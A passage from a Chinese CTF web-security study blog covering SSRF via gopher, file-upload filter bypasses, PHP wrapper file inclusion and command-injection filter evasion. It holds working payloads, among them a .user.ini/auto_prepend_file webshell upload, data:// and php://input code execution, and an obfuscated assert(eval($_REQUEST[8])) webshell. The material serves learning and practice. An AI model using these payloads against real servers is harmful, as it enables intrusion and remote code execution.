text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080/?url=http://127.0.0.1/flag.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">​</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string">​</span></span><br><span class="line"><span class="string">hello world!</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string">​</span></span><br><span class="line"><span class="string">submit</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h5 id="gopher打FastCGI"><a href="#gopher打FastCGI" class="headerlink" title="gopher打FastCGI"></a>gopher打FastCGI</h5><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121643002">看我这一篇</a></p>
<h5 id="gopher打redis"><a href="#gopher打redis" class="headerlink" title="gopher打redis"></a>gopher打redis</h5><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121667613">看我这一篇</a></p>
<h5 id="gopher打mysql"><a href="#gopher打mysql" class="headerlink" title="gopher打mysql"></a>gopher打mysql</h5><p>gopher打mysql，就是利用gopher协议传shell到mysql中。</p>
<p>首先Mysql存在三种连接方式</p>
<pre><code>Unix套接字；
内存共享/命名管道；
TCP/IP套接字；
</code></pre>
<p>MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。</p>
<pre><code>当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证
当无需密码认证时直接发送TCP/IP数据包即可
</code></pre>
<p>这儿对localhost和127.0.0.1做一个区别</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line">localhost也叫local ，正确的解释是：本地服务器。</span><br><span class="line"><span class="number">127.0.0.1</span>的正确解释是：本机地址（本机服务器），它的解析通过本机的host文件，windows自动将localhost解析为<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>。</span><br><span class="line">localhot（local）是不经网卡传输的，这点很重要，它不受网络防火墙和网卡相关的的限制。<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>是通过网卡传输，依赖网卡，并受到网络防火墙和网卡相关的限制</span><br><span class="line">简单说</span><br><span class="line">当我们通过mysql -hlocalhost -uname去连接的时候，没有经过网卡，使用的是unix套接字连接，这种时候我们tcpdump是抓不到包的</span><br><span class="line">当我们需要抓取mysql通信数据包时必须使用TCP/IP套接字连接。</span><br><span class="line">mysql -h <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> -uname</span><br></pre></td></tr></table></figure></div>

<p>我们平常打mysql最常用的就是打无密码的mysql</p>
<p>但是我们在用gopher还是需要用dict协议去得到mysql的端口(默认是3306)</p>
<p>直接使用的gopherus工具,直接快速生成payload<br><img src="/2022/05/28/Web-study/image-20220815234910350.png" alt="image-20220815234910350"></p>
<hr>
<h3 id="六、文件上传"><a href="#六、文件上传" class="headerlink" title="六、文件上传"></a>六、文件上传</h3><h4 id="1-多重过滤绕过"><a href="#1-多重过滤绕过" class="headerlink" title="1.多重过滤绕过"></a>1.多重过滤绕过</h4><p><u><strong>下面是以攻防世界的一道easyupload的wp讲解一些情形的绕过方式</strong></u></p>
<p>这里需要绕过的点如下</p>
<ul>
<li>检查文件内容是否有php字符串</li>
<li>检查后缀中是否有htaccess或ph</li>
<li>检查文件头部信息</li>
<li>文件MIME类型</li>
</ul>
<p>对于<u>第一点</u>可以利用<strong>短标签</strong>绕过，例如 <?=phpinfo();?></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">把short_open_tag 字段改为On，就可以实现短标签功能</span><br><span class="line"></span><br><span class="line">短标签：</span><br><span class="line"><span class="number">1</span>.能正常解析类似于这样形式的php文件： <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.使用<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>的形式输出，在短标签看来，<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.<span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span></span><br><span class="line">就相当于</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">正确：</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; phpinfo();?&gt;&lt;? echo $a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">报错：</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;&lt;? phpinfo();?&gt;&lt;?=$a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">从这个对比试验我们可以看出：</span><br><span class="line">在短标签模式下，</span><br><span class="line">我们执行php语句php函数，都用类似于这样形式的php文件：</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">但是我们要输出一个flag，或者变量时，使用<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>的形式输出</span><br></pre></td></tr></table></figure></div>

<p>对于<u>第二点</u>可以通过上传**.user.ini**以及正常jpg文件来进行getshell,可以参考以下文章</p>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">文章</a></p>
<p><strong>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</strong></p>
<p> <strong>这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。</strong></p>
<p> <strong>其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</strong></p>
<p><u>第三点</u>绕过方式即在文件头部添加一个图片的<strong>文件头</strong>，比如<code>GIF89a</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">JPG</span> ：FF D8 FF E0 <span class="number">00</span> <span class="number">10</span> <span class="number">4</span>A <span class="number">46</span> <span class="number">49</span> <span class="number">46</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF</span>(相当于文本的GIF89a)：<span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">PNG</span>： <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span></span><br></pre></td></tr></table></figure></div>

<p><u>第四点</u>绕过方法即修改上传时的Content-Type</p>
<p>因此最终的payload为：<br> 上传.user.ini，内容为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_file、<span class="built_in">auto</span>_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而<span class="built_in">auto</span>_append_file类似，只是在文件后面包含。 </span><br><span class="line"></span><br><span class="line">使用方法很简单，直接写在.user.ini中：</span><br></pre></td></tr></table></figure></div>

<p>上传a.jpg，内容为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h4 id="2-文件类型"><a href="#2-文件类型" class="headerlink" title="2.文件类型"></a>2.文件类型</h4><p><img src="https://img-blog.csdnimg.cn/20200226180218842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFqaWF3ZWk=,size_16,color_FFFFFF,t_70" alt="img"></p>
<hr>
<h3 id="七、文件包含"><a href="#七、文件包含" class="headerlink" title="七、文件包含"></a>七、文件包含</h3><h4 id="1-文件包含的四个函数："><a href="#1-文件包含的四个函数：" class="headerlink" title="1.文件包含的四个函数："></a>1.文件包含的四个函数：</h4><p>1.include():将在其被调用的位置处包含一个文件。包含一个文件与在该语句所在位置复制制定文件的数据具有相同内容的效果。使用include()时可以忽略括号。</p>
<p>2.include_once():在脚本执行期间包含并运行指定文件。此行为和 include() 语句类似，<u><strong>唯一区别是include_once()会先判断一下这个文件在之前是否已经被包含过，如已经包含，则忽略本次包含。</strong></u></p>
<p>3.replace() :很大程度上与include相同，都是将一个模板文件包含到require调用坐在的位置。</p>
<p>require和include之间有两点重要的区别:</p>
<p>1.无论require的位置如何，制定文件都将包含到出现require的脚本中。例如，即使require放在计算结果为假的if语句中，依然会包含指定文件。<br>2.require出错时，脚本将停止运行，而在使用include的情况下，脚本将继续执行。</p>
<p>4.replace_once():在脚本执行期间包含并运行指定文件。此行为和 require() 语句类似，<u><strong>唯一区别是require_once()会先判断一下这个文件在之前是否已经被包含过，如已经包含，则忽略本次包含</strong></u></p>
<p><u><strong>下面是一篇关于require_once被使用后不能再使用怎么绕开的文章，本人在2022年5月校内Dest0g3二次招新比赛遇到类似，特此记录</strong></u></p>
<p><a href="https://www.anquanke.com/post/id/213235">php源码分析 require_once 绕过不能重复包含文件的限制</a></p>
<p>下面为该题代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="comment">//find something in flag1.php </span></span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]; </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$d</span>, FILTER_VALIDATE_URL)) &#123;   </span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$d</span>);   </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;lai&quot;</span>) !== <span class="literal">false</span> &amp;&amp;</span><br><span class="line">  <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;ya&quot;</span>) !== <span class="literal">false</span>)  &#123;       </span><br><span class="line">            @<span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);     </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;       </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Sorry, you can not pass&quot;</span>);     </span><br><span class="line">        &#125;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/labour$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;   </span><br><span class="line">                  @<span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$d</span>);       </span><br><span class="line">                  <span class="keyword">echo</span> (<span class="variable">$a</span>);     </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;                                      <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);     </span><br><span class="line">                                    &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;why?&quot;</span>);   </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid URL&quot;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p><strong>文章关键：</strong></p>
<p><u><strong>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经<code>require_once(&#39;flag.php&#39;)</code>，已经include的文件不可以再require_once。</strong></u></p>
<p><u><strong>今天就来谈谈，怎么设想如何绕过这个哈希表，让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。</strong></u></p>
<p><u><strong>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过</strong></u></p>
<p>payload:</p>
<p>?d=0://labour/../../../../../flll1ag2.txt&amp;ctf=laiya</p>
<h4 id="2-php伪协议："><a href="#2-php伪协议：" class="headerlink" title="2.php伪协议："></a>2.php伪协议：</h4><p>内容来自于<a href="https://blog.csdn.net/qz362228/article/details/124359070">https://blog.csdn.net/qz362228/article/details/124359070</a></p>
<p><img src="https://img-blog.csdnimg.cn/92c9df98952f41669db5d8b8b2ffaead.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h5 id="1-php-协议"><a href="#1-php-协议" class="headerlink" title="1.php://协议"></a>1.php://协议</h5><p>​    <strong>·条件：</strong></p>
<p><code>allow_url_fopen:off/on</code><br><code>allow_url_include</code> :仅<code>php://input</code> <code>php://stdin</code> <code>php://memory</code> <code>php://temp</code> 需要<code>on</code></p>
<p><strong>·作用：</strong></p>
<p><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
<p>  <strong>·说明</strong>：</p>
<p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
<h5 id="2-php-filter伪协议"><a href="#2-php-filter伪协议" class="headerlink" title="2.php://filter伪协议"></a>2.php://filter伪协议</h5><p>   <strong>·条件</strong></p>
<p><code>allow_url_fopen=on/off</code><br><code>allow_url_include=on/off</code></p>
<p>只是<code>读取</code>，需要开启 allow_url_fopen，不需要开启 allow_url_include</p>
<p>​    <strong>·说明：</strong><br>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写<br>①输出进行<code>base64</code>加密后的信息</p>
<p><code>?file=php://filter/convert.base64-encode/resource=xx.php</code><br><code>或</code><br><code>?file=php://filter/read=convert.base64-encode/resource=xx.php</code></p>
<p>②获得将base64加密后的信息后，再将其解密，得出原信息</p>
<h5 id="3-php-input（读取POST数据）"><a href="#3-php-input（读取POST数据）" class="headerlink" title="3.php://input（读取POST数据）"></a>3.php://input（读取POST数据）</h5><p>   <strong>·条件</strong></p>
<p><code>allow_url_fopen=on/off</code><br><code>allow_url_include=on</code></p>
<p>   <strong>·说明</strong><br>可以访问请求的原始数据的只读流。在post请求中能查看请求的原始数据，<u><strong>并将post请求中的post数据当作php代码执行</strong></u>。（只读流是说只能进行读操作的数据）</p>
<p><code>例如</code></p>
<p>下面的POST数据里的命令就会被执行</p>
<p><img src="/2022/05/28/Web-study/image-20220801143739625.png" alt="image-20220801143739625"></p>
<p>即可以<u>直接读取到POST上</u>没有经过解析的原始数据。 <strong>enctype=”multipart/form-data”</strong> 的时候 php://input 是<strong>无效</strong>的</p>
<p><code>注</code> ：查看当前运行的是哪个php.ini<br>2,3需要将php可执行加入环境变量, 如果没有加,那么请使用php可执行文件所在位置的完整路径代替</p>
<p>1.打印出phpinfo();，找到Loaded Configuration File那一行</p>
<p><img src="https://img-blog.csdnimg.cn/09dde2a7f84145e291c34a1b2f19e26e.png" alt="https://img-blog.csdnimg.cn/09dde2a7f84145e291c34a1b2f19e26e.png"></p>
<p>2.命令行输入<code>php -i |grep php.ini</code>（<code>php -i</code>其实就是输出phpinfo();)</p>
<p>3.<code>php -r “phpinfo();” |grep php.ini</code></p>
<h5 id="4-file-伪协议（读取文件内容）"><a href="#4-file-伪协议（读取文件内容）" class="headerlink" title="4.file://伪协议（读取文件内容）"></a>4.file://伪协议（读取文件内容）</h5><p>   <strong>·条件</strong></p>
<p><code>allow_url_fopen=on/off</code><br><code>allow_url_include=on/off</code> （均不受影响）</p>
<p>打ctf中常用于读取本地文件</p>
<p><code>?file=file://C:\Windows\System32\drivers\etc\hosts</code></p>
<p><img src="https://img-blog.csdnimg.cn/1f9a0a4e11564da38bf19a9e83d3fb44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/1f9a0a4e11564da38bf19a9e83d3fb44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h5 id="5-phar-伪协议-读取压缩包文件内容"><a href="#5-phar-伪协议-读取压缩包文件内容" class="headerlink" title="5.phar://伪协议(读取压缩包文件内容)"></a>5.phar://伪协议(读取压缩包文件内容)</h5><p>   <strong>·条件</strong></p>
<p><code>allow_url_fopen: off/on</code><br><code>allow_url_include: off/on (均不受影响)</code></p>
<p><code>注</code>：php 版本大于等于<code>5.3.0</code>，压缩包需要是<code>zip</code>协议压缩，<code>rar</code>不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。</p>
<p>  <strong>·格式</strong></p>
<p><code>?file=phar://压缩包名/内部文件名</code><br><code>例：phar://x.zip/x.php</code></p>
<h5 id="6-zip-伪协议"><a href="#6-zip-伪协议" class="headerlink" title="6.zip://伪协议"></a>6.zip://伪协议</h5><p>zip伪协议和phar协议类似，但是用法不一样（url不同）</p>
<p>​    <strong>·条件</strong></p>
<p><code>allow_url_fopen: off/on</code><br><code>allow_url_include: off/on (均不受影响)</code></p>
<p>   <strong>·格式</strong></p>
<p><code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</code>   </p>
<p><code>例： zip://D:\phpstudy\WWW\x.zip%23shell.php       #-&gt;%23</code></p>
<h5 id="7-data-伪协议-读取文件"><a href="#7-data-伪协议-读取文件" class="headerlink" title="7.data://伪协议(读取文件)"></a>7.data://伪协议(读取文件)</h5><p>（可以直接达到执行php代码的效果）<br>和<code>php://input</code>很像，<code>php://input</code>以<code>post</code>提交数据那样提交数据，<br><code>data://</code>是以<code>get</code>方式提交数据，也是可以执行提交的脚本</p>
<p>​     <strong>·格式</strong></p>
<p><code>?file=data://text/plain,&lt;?php%20phpinfo()?&gt;</code></p>
<p>如果对特殊字符进行了过滤，可以通过base64编码后再输入</p>
<p><code>data://text/plain;base64,base64加密的代码</code></p>
<p>可配合<a href="https://www.cnblogs.com/xiaozi/p/7831529.html">php命令执行漏洞</a>，实现对一些数据的获取<br>如：<code>&lt;?php system(&quot;ls&quot;)?&gt;</code></p>
<h5 id="8-总结"><a href="#8-总结" class="headerlink" title="8.总结"></a>8.总结</h5><p><a href="https://blog.csdn.net/dreamthe/article/details/121765876">参考实例1</a></p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/106658417">参考实例2</a></p>
<hr>
<h3 id="八、逻辑漏洞"><a href="#八、逻辑漏洞" class="headerlink" title="八、逻辑漏洞"></a>八、逻辑漏洞</h3><hr>
<h3 id="九、命令执行"><a href="#九、命令执行" class="headerlink" title="九、命令执行"></a>九、命令执行</h3><h4 id="1-有关命令执行的知识（windows-或-linux-下）"><a href="#1-有关命令执行的知识（windows-或-linux-下）" class="headerlink" title="1.有关命令执行的知识（windows 或 linux 下）:"></a>1.有关命令执行的知识（windows 或 linux 下）:</h4><p>1）command1 ; command2 用;隔开表示为多个命令，命令按照从左到右的顺序执行，彼此无关联，所有的命令都会执行。先执行 command1 后执行 command2</p>
<p>2）command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2</p>
<p>3）command1 | command2 将两个命令分开，左边命令的输出作为右边命令的输入，只执行 command2</p>
<p>4）command1 &amp; command2 &amp;表示任务后台执行，与nohup命令功能差不多，先执行 command2 后执行 command1</p>
<p>5）command1 || command2 先执行 command1，如果为假，再执行 command2</p>
<p>命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符）</p>
<p>eg:</p>
<p>find  / -name “flag* “<br>在当前目录及其子目录下查找文件名中包含flag的文件<br>find  / -name “ *.txt”<br>在当前目录及其子目录下查找后缀为txt的文件</p>
<h4 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h4><h5 id="1-过滤cat"><a href="#1-过滤cat" class="headerlink" title="1.过滤cat"></a>1.过滤cat</h5><p><code>more，less，head，tac</code>    都可以对文本进行读取</p>
<h5 id="2-过滤空格"><a href="#2-过滤空格" class="headerlink" title="2.过滤空格"></a>2.过滤空格</h5><p><code>IFS$9、%09、&lt;、&gt;、&lt;&gt;、&#123;,&#125;、%20、$&#123;IFS&#125;、$&#123;IFS&#125;</code>来代替空格</p>
<p><code>&lt;,&gt;</code>是把内容导向某个地方，可以是文件，也可以是命令</p>
<p>如<code>cat&lt;flag.php</code>就是相当于，把flag.php内容用cat命令显示出来</p>
<p><code>%09</code>是tab键，可以补全内容</p>
<p>比如过滤了flag，但是需要访问flag233.php</p>
<p>那么就可以<code>cat %09*233.php</code>，就可以了</p>
<h5 id="3-过滤目录分隔符"><a href="#3-过滤目录分隔符" class="headerlink" title="3.过滤目录分隔符"></a>3.过滤目录分隔符</h5><p>也就是/不能用了，不能直接查看文件目录</p>
<p><code>cat /flag_is_here/flag_9012297169124.php</code></p>
<p>可以<strong>利用分号使两个命令同时进行</strong>也就是</p>
<p><code>127.0.0.1;cd flag_is_here;cat flag_9012297169124.php</code></p>
<h5 id="4-过滤运算符"><a href="#4-过滤运算符" class="headerlink" title="4.过滤运算符"></a>4.过滤运算符</h5><p>可以用;代替管道运算符</p>
<h5 id="5-绕过正则匹配"><a href="#5-绕过正则匹配" class="headerlink" title="5.绕过正则匹配"></a>5.绕过正则匹配</h5><p>比如</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>)</span></span>)</span><br></pre></td></tr></table></figure></div>

<p>所有大小写字母和数字都被正则匹配过滤了</p>
<p>这里就需要</p>
<p>法一：取反绕过：</p>
<p><u><strong>取反</strong>就是将数字转化为二进制,再把二进制中的1变成0,0变成1</u></p>
<p><code>~</code>是取反符号，</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">echo urlencode(~<span class="string">&#x27;eval($_REQUEST[8])&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">%9E%8C%8C%9A%8D%8B</span><br><span class="line">%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6</span><br><span class="line"></span><br><span class="line"><span class="comment">//php断言：assert — 检查一个断言是否为 false，如果参数是字符串，它将会被 assert() 当做 PHP 代码来执行</span></span><br></pre></td></tr></table></figure></div>

<p>然后再赋值</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XQUERY"><figure class="iseeu highlight /xquery"><table><tr><td class="code"><pre><span class="line">?code=(~<span class="meta">%9E</span><span class="meta">%8C</span><span class="meta">%8C</span><span class="meta">%9A</span><span class="meta">%8D</span><span class="meta">%8B</span>)(~<span class="meta">%9A</span><span class="meta">%89</span><span class="meta">%9E</span><span class="meta">%93</span><span class="meta">%D7</span><span class="meta">%DB</span><span class="meta">%A0</span><span class="meta">%AD</span><span class="meta">%BA</span><span class="meta">%AE</span><span class="meta">%AA</span><span class="meta">%BA</span><span class="meta">%AC</span><span class="meta">%AB</span><span class="meta">%A4</span><span class="meta">%C7</span><span class="meta">%A2</span><span class="meta">%D6</span>);</span><br><span class="line"></span><br><span class="line">//注意后面要有；，代表php代码结束</span><br><span class="line">//这里~是取反，之前urlencode里取反了一次，赋值时再取反一次，相当于没有取反</span><br><span class="line">等同于</span><br><span class="line">?code=(assert)(eval(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])),(assert)因为是assert是函数，被当作函数执行，于是因为断言(eval(<span class="variable">$_REQUEST</span>[<span class="number">8</span>]))，所以把eval(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])当作php执行，于是就可以拿到shell了</span><br><span class="line"></span><br><span class="line">蚁剑连接</span><br><span class="line">http://url?code=(~<span class="meta">%9E</span><span class="meta">%8C</span><span class="meta">%8C</span><span class="meta">%9A</span><span class="meta">%8D</span><span class="meta">%8B</span>)(~<span class="meta">%9A</span><span class="meta">%89</span><span class="meta">%9E</span><span class="meta">%93</span><span class="meta">%D7</span><span class="meta">%DB</span><span class="meta">%A0</span><span class="meta">%AD</span><span class="meta">%BA</span><span class="meta">%AE</span><span class="meta">%AA</span><span class="meta">%BA</span><span class="meta">%AC</span><span class="meta">%AB</span><span class="meta">%A4</span><span class="meta">%C7</span><span class="meta">%A2</span><span class="meta">%D6</span>);</span><br></pre></td></tr></table></figure></div>





<p>法2：异或绕过:</p>
<p>在PHP中两个字符串异或之后，得到的还是一个字符串。<br> 例如：异或 <code>?</code> 和 <code>~</code> 之后得到的是 <code>A</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">字符：?         ASCII码：63           二进制：  00‭11 1111‬</span><br><span class="line">字符：~         ASCII码：126          二进制： <span class="number"> 0111 </span>1110‬</span><br><span class="line">异或规则：</span><br><span class="line">1   XOR  <span class="number"> 0 </span>  =   1</span><br><span class="line">0   XOR  <span class="number"> 1 </span>  =   1</span><br><span class="line">0   XOR  <span class="number"> 0 </span>  =   0</span><br><span class="line">1   XOR  <span class="number"> 1 </span>  =   0</span><br><span class="line">上述两个字符异或得到 二进制： <span class="number"> 0100 </span>0001</span><br><span class="line">该二进制的十进制也就是：65</span><br><span class="line">对应的ASCII码是：A</span><br></pre></td></tr></table></figure></div>

